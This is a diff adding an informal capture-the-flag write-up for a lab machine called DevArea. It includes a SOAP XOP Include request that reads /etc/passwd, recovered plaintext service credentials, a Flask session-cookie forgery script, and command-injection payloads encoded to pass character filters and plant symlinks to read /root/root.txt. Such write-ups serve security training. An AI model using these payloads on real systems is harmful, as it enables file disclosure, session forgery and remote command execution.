@@ -1,0 +1,213 @@
+[Profile]{
+Machine: DevArea 
+ip: 10.129.244.208
+OS: Linux
+}
+
+[Enumeration]{
+nmap -sC -sV -Pn 10.129.244.208 -oN nmap_devarea
+|21/ ftp (vsftpd 3.0.5) ,
+|22/ssh ,
+|80/ http Apache httpd 2.4.58, 
+|8080/ http Jetty 9.4.27v20200227, 
+|8500/ http Golang net/http server, 
+|8888/tcp open  http  Golang net/http server (Go-IPFS json-rpc or InfluxDB API) 
+
+We connect to ftp with ncftp and we find a file employee-service.jar, we download it and we want to inspect it so we extract it. 
+  when we decompile the jar we got from ftp to see some code, we see interesting stuff
+    ```Java ServerStarter.class
+        objectRef_00.setServiceBean(objectRef);
+        objectRef_01.setAddress("http://0.0.0.0:8080/employeeservice");
+        objectRef_01.create();
+        pPVar1 = System.out;
+        pPVar1.println("Employee Service running at http://localhost:8080/employeeservice");
+        pPVar1 = System.out;
+        pPVar1.println("WSDL available at http://localhost:8080/employeeservice?wsdl");
+
+    ```
+  we discover there is EmployeeService who can submit a Report.
+  Here we have the submitReport function
+    ```Java EmployeeServiceImpl.class
+      
+        /* Flags:
+             ACC_PUBLIC
+   
+          public String submitReport(Report report)  */
+        
+        String submitReport_htb.devarea.Report_java.lang.String(EmployeeServiceImpl this,Report param1)
+        
+        {
+          boolean bVar3;
+          StringBuilder pSVar1;
+          String pSVar2;
+          
+          bVar3 = param1.isConfidential();
+          if (bVar3) {
+            pSVar1 = new StringBuilder();
+            pSVar1 = pSVar1.append("Report marked confidential. Thank you, ");
+            pSVar2 = param1.getEmployeeName();
+            pSVar1 = pSVar1.append(pSVar2);
+            pSVar2 = pSVar1.toString();
+          }
+          else {
+            pSVar1 = new StringBuilder();
+            pSVar1 = pSVar1.append("Report received from ");
+            pSVar2 = param1.getEmployeeName();
+            pSVar1 = pSVar1.append(pSVar2);
+            pSVar2 = pSVar1.toString();
+          }
+          pSVar1 = new StringBuilder();
+          pSVar1 = pSVar1.append(pSVar2);
+          pSVar1 = pSVar1.append(". Department: ");
+          pSVar2 = param1.getDepartment();
+          pSVar1 = pSVar1.append(pSVar2);
+          pSVar1 = pSVar1.append(". Content: ");
+          pSVar2 = param1.getContent();
+          pSVar1 = pSVar1.append(pSVar2);
+          pSVar2 = pSVar1.toString();
+          return pSVar2;
+        }
+        
+
+And let's look into it, by the time let's look in the Jetty server version cve or exploit to see a path.
+the 8500 Golang is a proxy server apparently ( it is what it said ), we have to look into it.
+the 8888 Golang one serves us a login page, we have to look for it specifically too.
+  Hoverly let's google it to see if we can exploit it, but we don't know the version yet.
+
+}
+
+[Exploitation]{
+Thank to that we try to submit a report, and it work with this type of request:
+```BurpSuite
+POST /employeeservice HTTP/1.1
+Host: devarea.htb:8080
+Content-Type: text/xml
+Content-Length: 887
+
+<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+               xmlns:tns="http://devarea.htb/">
+  <soap:Body>
+    <tns:submitReport>
+      <arg0>
+        <confidential>true</confidential>
+        <employeeName>John Doe</employeeName>
+        <department>Engineering</department>
+        <content>This is the report content</content>
+      </arg0>
+    </tns:submitReport>
+  </soap:Body>
+</soap:Envelope>
+```
+Now let's look if we can get sensitive information through this.
+
+```Burpsuite
+POST /employeeservice HTTP/1.1
+Host: devarea.htb:8080
+Content-Type: multipart/related; type="application/xop+xml"; start="<root.message@cxf.apache.org>"; boundary="----=_Part_0"
+Content-Length: 716
+
+------=_Part_0
+Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
+Content-Transfer-Encoding: 8bit
+Content-ID: <root.message@cxf.apache.org>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">
+  <soap:Body>
+    <tns:submitReport>
+      <arg0>
+        <confidential>true</confidential>
+        <employeeName>John</employeeName>
+        <department>IT</department>
+        <content>
+          <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/>
+        </content>
+      </arg0>
+    </tns:submitReport>
+  </soap:Body>
+</soap:Envelope>
+
+------=_Part_0--
+```
+And this is how we will get sensitive information through it.
+Now we have to get informations to login in the hoverly stuff ( and more we know it is vulnerable CVE-2025-54123 ).
+```/etc/systemd/system/hoverfly.service 
+[Unit]
+Description=HoverFly service
+After=network.target
+
+[Service]
+User=dev_ryan
+Group=dev_ryan
+WorkingDirectory=/opt/HoverFly
+ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
+
+Restart=on-failure
+RestartSec=5
+StartLimitIntervalSec=60
+StartLimitBurst=5
+LimitNOFILE=65536
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
+```
+
+We got creds to login in hoverfly.
+We log in and we confirm version of hoverfly is 1.11.3 So it is really vulnerable to what we expect.
+
+And we got the user.txt *-*
+}
+
+[PrivEsc]{
+Here sudo -l, and we see we have access to /opt/syswatch/syswatch.sh
+```
+dev_ryan@devarea:/opt/HoverFly$ cat /etc/syswatch.env
+SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
+SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
+SYSWATCH_LOG_DIR=/opt/syswatch/logs
+SYSWATCH_DB_PATH=/opt/syswatch/syswatch_gui/syswatch.db
+SYSWATCH_PLUGIN_DIR=/opt/syswatch/plugins
+SYSWATCH_BACKUP_DIR=/opt/syswatch/backup
+SYSWATCH_VERSION=1.0.0
+```
+Here we have the key that we can use to forge valid session cookies through flask
+```flaskSessionCookieForgery.py
+import flask
+from flask.sessions import SecureCookieSessionInterface
+
+app = flask.Flask('test')
+app.secret_key = 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725'
+
+with app.app_context():
+    si = SecureCookieSessionInterface()
+    s = si.get_signing_serializer(app)
+    cookie = s.dumps({'user_id': 1, 'username': 'admin'})
+    print(cookie)
+```
+The cookie we got is :
+eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aj6upw.jetnt6CERM6YcRhRFE-yalZN-_s
+
+curl -b "session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aj6upw.jetnt6CERM6YcRhRFE-yalZN-_s" -X POST http://127.0.0.1:7777/service-status -d "service=ssh | id"
+we see that we are uid=984(syswatch), RCE and we can write  in /opt/syswatch/logs.
+
+curl -b "session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.aj6upw.jetnt6CERM6YcRhRFE-yalZN-_s" -X POST http://127.0.0.1:7777/service-status -d "service=ssh |  ln -sf \
+$(printf '\057root\057root\056txt') \
+$(printf '\057opt\057syswatch\057logs\057chain\056log')"
+
+But we can do it like that because it refuse / . \ characters so we have to bypass it, we will do through the python payload :
+cmd = 'import os; os.symlink("/root/root.txt", "/opt/syswatch/logs/chain.txt")'
+payload = '+'.join(f'chr({ord(c)})' for c in cmd)
+
+and we will do it again to bypass symlink prevention by double symlink it
+
+cmd = 'import os; os.symlink("root.txt", "/opt/syswatch/king.log")'
+payload = '+'.join(f'chr({ord(c)})' for c in cmd)
+
+Then we run sudo /opt/syswatch/syswatch.sh logs king.log
+
+And after a few tries, we got the root.txt *-*
+
+}
